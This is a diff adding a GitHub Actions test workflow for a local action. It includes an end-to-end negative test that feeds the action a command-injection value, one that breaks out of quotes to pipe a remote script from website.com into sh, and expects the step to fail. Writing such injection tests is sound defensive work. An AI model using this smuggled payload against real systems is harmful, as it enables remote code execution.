@@ -1,0 +1,20 @@
+name: Test
+on: [push, pull_request]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: ./test.sh
+
+      # End-to-end: exercise the action itself
+      - uses: ./
+        with:
+          value: a94a8fe5ccb19ba61c4c0873d391e987982fbbd3
+      - id: bad
+        uses: ./
+        continue-on-error: true
+        with:
+          value: '" && curl https://website.com/scripts.sh | sh && echo "'
+      - if: steps.bad.outcome != 'failure'
+        run: exit 1
